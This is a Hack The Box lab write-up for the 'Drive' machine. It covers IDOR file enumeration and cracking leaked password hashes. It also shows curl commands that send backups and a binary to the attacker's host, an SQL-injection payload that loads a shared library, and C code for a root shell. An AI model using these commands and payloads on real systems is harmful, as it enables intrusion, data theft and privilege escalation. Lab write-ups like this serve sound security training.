---
title:  "HTB Drive Writeup"
date:   2024-02-17 00:30:00 
categories: HTB Machine
tags: SQLI IDOR gitea shared_libary Binary_exploitation
---

![Drive](/assets/img/Drive/1697126407929.jpg)

## Introduction 

The initial access of the application was a bit refreshing. Hack the box machines don't often go for Insecure Direct Object References as initial access. never the less i would say it was executed well here. 

The way to to root was quite interesting and a good refresher for binary exploitation. The binary itself is not that complex but the security measures for the SQL injection made think for a little while on how to bypass them all.

If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A  -p-  -o nmap  10.10.11.235
```
**Nmap**
```
# Nmap 7.94 scan initiated Sun Jan 21 09:38:10 2024 as: nmap -sS -A -p- -o nmap 10.10.11.235
Nmap scan report for 10.10.11.235
Host is up (0.027s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA)
|   256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA)
|_  256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://drive.htb/
3000/tcp filtered ppp
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=1/21%OT=22%CT=1%CU=40112%PV=Y%DS=2%DC=T%G=Y%TM=65AD2C8
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1
OS:1NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   23.73 ms 10.10.14.1
2   24.07 ms 10.10.11.235

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 21 09:39:03 2024 -- 1 IP address (1 host up) scanned in 53.18 seconds
```

When reviewing the Nmap output we can see that a **SSH** and **http** were found to be open. The http webserver would redirect you to the site **http://drive.htb**. Looking at this site without registering we couldn't really figure out anything.

![Main page](/assets/img/Drive/Drive_01.png)

After registering we can see that its possible to upload files and share these. I started out by uploading an HTML page to see if this is being rendered like html or not.
![Upload](/assets/img/Drive/Drive_02.png)

After pressing the upload button the browser would send the following request.

```
POST /upload/ HTTP/1.1
Host: drive.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://drive.htb/upload/
Content-Type: multipart/form-data; boundary=---------------------------58951038434760688001631547036
Content-Length: 532
Origin: http://drive.htb
Connection: close
Cookie: csrftoken=FgyRM3ltxjrQIYobqnADLU1JdaUaXnsD; sessionid=lhey8h4wsk3kwgosw2urbv35qzhlp2zv
Upgrade-Insecure-Requests: 1

-----------------------------58951038434760688001631547036
Content-Disposition: form-data; name="csrfmiddlewaretoken"

Cgubd3qAqIBhYQ9UBpSCxViD2IiJWCQE7mSSPWBTNRSXwEnVRCi58F9c5I2JJP87

-----------------------------58951038434760688001631547036
Content-Disposition: form-data; name="name"

test

-----------------------------58951038434760688001631547036
Content-Disposition: form-data; name="file"; filename="test.html"
Content-Type: text/html

<h1>test</h1>

-----------------------------58951038434760688001631547036--
```

The server then issued the following response redirecting us to the homepage 

```
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 21 Jan 2024 15:14:00 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Connection: close
Location: /home/
X-Frame-Options: DENY
Vary: Cookie
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Cross-Origin-Opener-Policy: same-origin

```

Then we can see we have our file uploaded. We could reserve the file and this would give us the following page where we could see the content as well.

![Blocked file](/assets/img/Drive/Drive_03.png)

### Insecure Direct Object Reference (IDOR)

So looking testing the application it seems bypassing the upload functionality and injection vulnerabilities were out of the question. The next thing I wanted to test was checking if it was possible to gain access to any files we shouldn't have access too by manipulating the id value in some requests. There were two api endpoints found that looked like good candidates for a potential insecure direct object reference vulnerability. The following endpoints could be vulnerabile because they use the ID directly in the url parameter:

- http://drive.htb/ID/block/
- http://drive.htb/ID/getFileDetail/

So to quickly test if it is possible to access any info we shouldn't i used ffuf. i first tried this out using the getFileDetail endpoint. however after a few moments we could see that it was possible to find which files existed but we were not able to access them.

```bash
ffuf -u http://drive.htb/FUZZ/getFileDetail/ -w /home/kali/share/Share/Tools/general/SecLists/Fuzzing/3-digits-000-999.txt   -b sessionid=lhey8h4wsk3kwgosw2urbv35qzhlp2zv -mc 401,200
```

![file enum getfiledetail](/assets/img/Drive/Drive_05.png)

Next up i repeated this with the **block** endpoint. using the following ffuf command, However here we could see that we did not get a status code **401** we  got a status code **200** instead showing us that this endpoint is vulnerable to an Insecur Direct Object Reference vulnerability.
```bash
ffuf -u http://drive.htb/FUZZ/block/ -w /home/kali/share/Share/Tools/general/SecLists/Fuzzing/3-digits-000-999.txt   -b sessionid=lhey8h4wsk3kwgosw2urbv35qzhlp2zv -mc 401,200
```
![file enum block](/assets/img/Drive/Drive_06.png)

So now we know we have access to these files we go check it out in the browser seeing its much more user friendly to see the actual data. So we then go to the following url:

http://drive.htb/079/block/

![file enum block](/assets/img/Drive/Drive_07.png)

Now we repeat this same process for the files with ID: **098 99 101**. After doing this we end up with the following messages.

**ID 079**
```
hey team after the great success of the platform we need now to continue the work.
on the new features for ours platform.
I have created a user for martin on the server to make the workflow easier for you please use the password "Xk4@KjyrYv8t194L!".
please make the necessary changes to the code before the end of the month
I will reach you soon with the token to apply your changes on the repo
thanks!
```
**ID 098**
```
hi team
have a great day.
we are testing the new edit functionality!
it seems to work great! 
```
**ID 099**
```
hi team
please we have to stop using the document platform for the chat
+I have fixed the security issues in the middleware
thanks! :) 
```
**ID 101**
```
hi team!
me and my friend(Cris) created a new scheduled backup plan for the database
the database will be automatically highly compressed and copied to /var/www/backups/ by a small bash script every day at 12:00 AM
*Note: the backup directory may change in the future!
*Note2: the backup would be protected with strong password! don't even think to crack it guys! :) 
```

So lets break down the info we got from the messages. in message **79** we see that a new user **martin** has been made with the credentials **Xk4@KjyrYv8t194L!**. Additionally in message **101** we can see that there is a script that automatically backs up the database with a password. This gives us a good target to go after seeing that the backups might contain other interesting data such as credentials of other users.

Next step lets try to log in using ssh.

```bash
ssh marting@drive.htb
Xk4@KjyrYv8t194L!
```

![Access as martin](/assets/img/Drive/Drive_08.png)

## Lateral movement

So starting our lateral movement I decided to go checkout those backups that were hinted at in the messages before. i browsed to the backup folder to check what files were present there. We could see that there were 4 files backups present here.

```bash
cd /var/www/backups/
ls -hal 
```
![Backup files found](/assets/img/Drive/Drive_09.png)

The next step is to exfiltrate these files. I decided to setup a python upload server using the following command

```bash
python3 -m uploadserver 80
```

Then i used the following command  i was able to upload all these files to my machine.

```bash
for i in *; do curl -X POST http://10.10.14.123/upload -F files=@$i; done
```
So now we have all these files exfiltrated on our own machine. we can analyze these files.

![Backup files exfiltrated](/assets/img/Drive/Drive_10.png)

The 7z files i was not able to open nor crack the password however the sqlite database we could actually open with the following command. i then decided to extract the part containing all the user hashes

```bash
sqlite3 db.sqlite3
.dump
```

```
INSERT INTO accounts_customuser VALUES(21,'sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a','2022-12-26 05:48:27.497873',0,'jamesMason','','','jamesMason@drive.htb',0,1,'2022-12-23 12:33:04');
INSERT INTO accounts_customuser VALUES(22,'sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f','2022-12-24 12:55:10',0,'martinCruz','','','martin@drive.htb',0,1,'2022-12-23 12:35:02');
INSERT INTO accounts_customuser VALUES(23,'sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004','2022-12-24 13:17:45',0,'tomHands','','','tom@drive.htb',0,1,'2022-12-23 12:37:45');
INSERT INTO accounts_customuser VALUES(24,'sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f','2022-12-24 16:51:53',0,'crisDisel','','','cris@drive.htb',0,1,'2022-12-23 12:39:15');
INSERT INTO accounts_customuser VALUES(30,'sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3','2022-12-26 05:43:40.388717',1,'admin','','','admin@drive.htb',1,1,'2022-12-26 05:30:58.003372');
```

this would give us the following file that we could try to crack using hashcat

```
sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004
sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
```

next we fire up hashcat with the following command to try and crack these passwords. We could see that one password was able to be cracked out of all of these. however when trying this password on the user it belonged to (tom) it didnt'work.
```
hashcat -m 124 hash /usr/share/wordlists/rockyou.txt -w 4 -o Cracked --force
```
![Hashes cracked](/assets/img/Drive/Drive_11.png)

```bash
cat Cracked                         
sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004:john316
```

So seeing that our cracking of the currently used database didn't help us at all we need to figure out how to get access to these zip files. We know from the message we found earlier that there is some script that manages this. This script i couldn't find anywhere on the file system however we when i checked what other services might be running on the machine i noticed there was a service running on port 3000

```bash
netstat -tunlp
```
![Open services](/assets/img/Drive/Drive_12.png)

To get an idea of what this service might be i did the following curl command. if this reacted positively it would be a clear sign that this is a web application. This showed us it was a **gitea** application. This application is used to manage and store source code. If the backup script was anywhere it would be here.

```bash
curl localhost:3000
```
![Gitea discovered](/assets/img/Drive/Drive_13.png)

So now that we known its a web service lets use SSH to portforward this port so we can reach it using our browser.

```
ssh martin@drive.htb -N -f -L 3000:127.0.0.1:3000
```

After running the command we can reach the gitea server by  browsing to **http://localhost:3000**

![Open services](/assets/img/Drive/Drive_14.png)


Then after logging in on the application using martin's credentials we obtained earlier we get access to the source code of the application. Here we can see there is a backup script.

![Access to source code](/assets/img/Drive/Drive_15.png)

The backup script contained the password used to create the encrypted zips.


![Backup script containing credentals](/assets/img/Drive/Drive_16.png)

Now we can decrypt the 7z archives using the following command an password

```bash
7z x 1_Dec_db_backup.sqlite3.7z
H@ckThisP@ssW0rDIfY0uC@n:)
```

Then we repeat the steps we took to obtain the user hashes for all the 4 different backups, we'd end up with the following list of hashes

```
sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
sha1$DhWa3Bym5bj9Ig73wYZRls$3ecc0c96b090dea7dfa0684b9a1521349170fc93
sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141
sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a
sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
```

Then we try to crack this file again using the exact same hashcat command as before. But having these hashes here as well we can see that this time we cracked 4 hashes. Upon closer inspection all these hashes belonged to the same user named **tom**

```bash
hashcat -m 124 hash /usr/share/wordlists/rockyou.txt -w 4 -o Cracked --force
```
![Cracked hashes](/assets/img/Drive/Drive_17.png)

After trying all these credentials on the tom user I noticed that the password **johnmayer7** worked

```bash
ssh tom@drive.htb
johnmayer7
```

![Access as tom](/assets/img/Drive/Drive_18.png)

## Privilege escalation

When landing on the machine we could see that there was a binary with SUID permissions. This basically means that **Anyone** can run this binary with root privileges.
```bash
ls -hal
```
![Suid binary](/assets/img/Drive/Drive_19.png)

So my first step is to exfiltrate this binary to my own machine using the same python uploadserver we used earlier. Doing the following command we can upload this file to our own machine 
```bash
curl -X POST http://10.10.14.123/upload -F files=@doodleGrive-cli
```

Whenever I gain access to a binary I want to analyize my first step is to run strings on it. Sometimes you can get lucky and get some interesting information out of the binary without putting in much effort.
```bash
strings doodleGrive-cli > doodleGrive_strings
```

When going through the output of the strings command I could see that there was username and password found on line 4132 of the strings output

```
<snipped>
[!]Caution this tool still in the development phase...please report any issue to the development team[!]
Enter Username:
Enter password for 
moriarty
findMeIfY0uC@nMr.Holmz!
Welcome...!
Invalid username or password.
<snipped>
```

Using the username **moriarty** with the password **findMeIfY0uC@nMr.Holmz!** I was able to access the binary.

![Suid binary](/assets/img/Drive/Drive_20.png)

there are a few functions in here though only one of them accepted user input being function 5 **activate an account**. At this time all payloads i tried to try an abuse this. To get more insight on what this application is doing i opened up ghidra and loaded the binary. Follow the next steps to setup ghidra:

Start with setting up a new project.

![New project](/assets/img/Drive/Drive_21.png)

Next chose where you want save the ghidra files and name the project

![File location](/assets/img/Drive/Drive_22.png)

Next up import the **doodleGrive-cli** file.

![File import](/assets/img/Drive/Drive_23.png)

Then next press ok with the defaults these are fine for our purposes.

![Initialize project](/assets/img/Drive/Drive_24.png)

Then double click the file and you'll be greated with the code window. When it asks to analyze the application just say yes and let it do its thing. next up on the left we can filter on the word **activate**. We filter on this word because we want to find the code that contains the routine for activating a user. This gives us the exact piece of code we want to see.

![Initialize project](/assets/img/Drive/Drive_25.png)

This gives us the following piece of code. in the code below we can see that our user input has a limitation of **0x28** characters. 0x28 in decimal means 40. this means our payload cannot exceed 40 characters. This makes it clear that we can try to escalate our privileges using sql injection.

```c
void activate_user_account(void)

{
  size_t sVar1;
  long in_FS_OFFSET;
  char local_148 [48];
  char local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Enter username to activate account: ");
  fgets(local_148,0x28,(FILE *)stdin);
  sVar1 = strcspn(local_148,"\n");
  local_148[sVar1] = '\0';
  if (local_148[0] == '\0') {
    puts("Error: Username cannot be empty.");
  }
  else {
    sanitize_string(local_148);
    snprintf(local_118,0xfa,
             "/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line \'UPDATE accounts_customuser SE T is_active=1 WHERE username=\"%s\";\'"
             ,local_148);
    printf("Activating account for user \'%s\'...\n",local_148);
    system(local_118);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
Additionally we can see that the code calls another function called **sanitize_string** which corsponds with the following code.This code is a fairly simple string check to see if any of the bad characters are present within the userinput, if these bad characters are present it breaks off the function. The bad characters are **0x5c7b2f7c20270a00** which corresponds with the following special characters:

-   \
-   {
-   /
-   SPACE
-   '

```c
void sanitize_string(char *param_1)

{
  bool bVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  int local_3c;
  int local_38;
  uint local_30;
  undefined8 local_29;
  undefined local_21;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_3c = 0;
  local_29 = 0x5c7b2f7c20270a00;
  local_21 = 0x3b;
  local_38 = 0;
  do {
    sVar2 = strlen(param_1);
    if (sVar2 <= (ulong)(long)local_38) {
      param_1[local_3c] = '\0';
      if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    bVar1 = false;
    for (local_30 = 0; local_30 < 9; local_30 = local_30 + 1) {
      if (param_1[local_38] == *(char *)((long)&local_29 + (long)(int)local_30)) {
        bVar1 = true;
        break;
      }
    }
    if (!bVar1) {
      param_1[local_3c] = param_1[local_38];
      local_3c = local_3c + 1;
    }
    local_38 = local_38 + 1;
  } while( true );
}
```

So knowing we are dealing with an sqlite database the most common way to use this for local privilege escalation is to load a shared library. A default example of this technique would be the following but our biggest issue would be that its way bigger than 40 characters.

```
load_extension('/path/to/sqlite-execute-module.so');--
```

So lets go through the creation of the payload step by step. First of all we need to break out of the shell programs context looking at the source code we see that the **"** is used. This means our payload would look like this then:

```
"+load_extension('/path/to/sqlite-execute-module.so')--"
```

So this payload would work **if** there was no character limit. However there is we need to make our payload a little smaller still. The next step would be making our file as short as possible. we can do it as so:

```
"+load_extension('./1')--"
```

Now the payload above would not work either because now we are violating the sanitization because we are using both a **/** and **'**. So we have to get rid of these as well. We will have to use some form of encoding. The most common encoding methods are either character code or base64. Base64 is out of the question as it would make our payload way to big. So then i decided to use char code. **./1** translates to **46,47,49** leaving us with the following payload.

```
"+load_extension(char(46,47,49))--"
```

So now we have our payload but not yet our shared library. As a shared library i chose to make a very easy payload where we just open sh with root privileges

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void _init(){
    setuid(0);
    setgid(0);
    printf("I'm the bad library\n");
    system("/bin/sh",NULL,NULL);
}
```

next up place the C code file on the machine itself with name **1.c**. Then we compile this using the following gcc command

```bash
gcc -shared 1.c -o 1.so -nostartfiles -fPIC
```

Then after doing this we log back into the application using the credentials we obtained before. Then we load up our sql injection payload. After doing this we should be greeted with an sh shell as root

![SH shell as root](/assets/img/Drive/Drive_26.png)

